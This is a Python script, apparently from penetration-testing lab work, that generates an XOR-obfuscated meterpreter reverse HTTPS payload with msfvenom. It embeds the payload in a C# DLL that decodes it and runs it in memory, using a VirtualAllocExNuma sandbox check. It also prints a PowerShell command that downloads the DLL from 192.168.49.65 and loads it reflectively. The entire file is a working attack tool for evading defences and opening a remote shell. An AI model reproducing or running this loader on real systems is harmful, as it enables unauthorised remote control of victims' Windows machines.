#!/bin/env python3
from ak import *
import os
import subprocess

LHOST = "192.168.49.65"
LPORT = 443
BASE_FILENAME = 'win_ps_dll_runner'
MSFVENOM_CMD = f"msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f raw -e generic/none"
#MSFVENOM_CMD = f"msfvenom --platform Windows -p windows/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f raw -e generic/none"
SVCHOST_PATH = b"C:\\\\Windows\\system32\\svchost.exe"
XOR_KEY = b'\x09'

def enc_shellcode(shellcode):
  key = bytearray(b'\x09') * len(shellcode)
  return [ a ^ b for (a,b) in zip(shellcode, key) ] 

def generate(shellcode):
  svchost_path = Obfuscator(SVCHOST_PATH)

  template = """
using System;
using System.Runtime.InteropServices;

namespace LeMans
{{
    public class Class1
    {{
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        public static void ferrari()
        {{
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {{
                return;
            }}

            byte[] buf = new byte[] {{ {xor_shellcode} }};

            for (int i = 0; i < buf.Length; i++)
            {{
                buf[i] = (byte)(((uint)buf[i] ^ {xor_key}) & 0xFF);
            }}

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, buf.Length);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }}
    }}
}}
""".format(xor_shellcode=shellcode.get_hex_csharp(),xor_svchost_path=svchost_path.get_hex_csharp(), xor_key=shellcode.get_key_csharp())

  print(template)
  f = open(BASE_FILENAME + '.cs', "w")
  f.write(template)
  f.close()

  ps = """
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.65/{fn}')
$assem = [System.Reflection.Assembly]::Load($data)

$class = $assem.GetType('LeMans.Class1')
$method = $class.GetMethod("ferrari")
$method.Invoke(0, $null)
""".format(fn=BASE_FILENAME + '.dll')
  print(ps)


def compile():
  cmd = f"mcs /target:library {BASE_FILENAME}.cs"
  os.system(cmd)

def main():
  shellcode = ShellCode(MSFVENOM_CMD, xor_key=XOR_KEY)
  generate(shellcode)
  compile() 


if __name__ == "__main__":
  main()
